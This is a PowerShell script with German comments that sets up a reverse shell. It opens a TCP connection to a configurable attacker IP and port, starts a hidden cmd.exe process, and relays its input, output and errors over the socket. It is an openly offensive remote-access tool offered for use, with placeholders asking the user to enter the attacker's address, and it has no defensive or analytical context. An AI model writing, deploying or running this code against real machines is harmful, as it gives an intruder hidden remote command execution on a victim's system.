# PowerShell-only CMD Reverse Shell (ohne Installationen oder externe Tools)
# Dieses Skript verwendet nur integrierte Windows-Funktionen, um eine CMD-Reverse-Shell zu erstellen.

# --- KONFIGURATION START ---
$ip = "192.168.2.127"  # <--- HIER IHRE ANGREIFER-IP-ADRESSE EINGEBEN!
$port = 124           # <--- HIER IHREN LISTENER-PORT EINGEBEN!
# --- KONFIGURATION ENDE ---

# Erstelle ein TCP-Client-Objekt und verbinde dich mit dem Listener
$client = New-Object System.Net.Sockets.TCPClient($ip,$port);

# Hole den Netzwerk-Stream für das Senden und Empfangen von Daten
$stream = $client.GetStream();
$sr = New-Object System.IO.StreamReader($stream); # Zum Lesen von Daten vom Listener
$sw = New-Object System.IO.StreamWriter($stream); # Zum Schreiben von Daten zum Listener

# Starte den cmd.exe-Prozess
$process = New-Object System.Diagnostics.Process;
$process.StartInfo.FileName = "cmd.exe";
$process.StartInfo.UseShellExecute = $false;     # Deaktiviert die Verwendung der Shell-Ausführung
$process.StartInfo.RedirectStandardInput = $true;  # Leitet die Standardeingabe um
$process.StartInfo.RedirectStandardOutput = $true; # Leitet die Standardausgabe um
$process.StartInfo.RedirectStandardError = $true;  # Leitet die Standardfehlerausgabe um
$process.StartInfo.CreateNoWindow = $true;       # Verhindert, dass ein CMD-Fenster sichtbar wird
$process.Start();

# Hole die umgeleiteten Streams des cmd.exe-Prozesses
$input_stream = $process.StandardInput;
$output_stream = $process.StandardOutput;
$error_stream = $process.StandardError;

# Erstelle einen Puffer für das Lesen von Daten
[byte[]]$buffer = 0..4095 | %{0}; # Puffer für 4KB Daten

# Beginne, Ausgaben vom CMD-Prozess zum Netzwerk-Stream umzuleiten
# Dies geschieht asynchron, um eine reibungslose Interaktion zu gewährleisten.
$output_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, {
    param($ar)
    # Beende den Lesevorgang
    $read = $output_stream.BaseStream.EndRead($ar);
    if($read -gt 0) {
        # Schreibe gelesene Daten zum Netzwerk-Stream
        $stream.Write($buffer, 0, $read);
        $stream.Flush(); # Leere den Puffer sofort
        # Starte den nächsten Lesevorgang
        $output_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
    }
}, $null);

# Mache dasselbe für die Fehlerausgabe
$error_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, {
    param($ar)
    $read = $error_stream.BaseStream.EndRead($ar);
    if($read -gt 0) {
        $stream.Write($buffer, 0, $read);
        $stream.Flush();
        $error_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
    }
}, $null);

# Hauptschleife: Lese Befehle vom Listener und sende sie an den CMD-Prozess
while($client.Connected -and -not $process.HasExited) {
    try {
        # Lese eine Zeile vom Netzwerk-Stream (vom Listener)
        $data = $sr.ReadLine();
        # Schreibe die gelesene Zeile in die Standardeingabe des CMD-Prozesses
        $input_stream.WriteLine($data);
        $input_stream.Flush();
    } catch {
        # Wenn ein Fehler auftritt (z.B. Verbindung verloren), beende die Schleife
        break;
    }
}

# Aufräumen: Schließe alle offenen Ressourcen
$client.Close();
$process.Close();
$input_stream.Close();
$output_stream.Close();
$error_stream.Close();
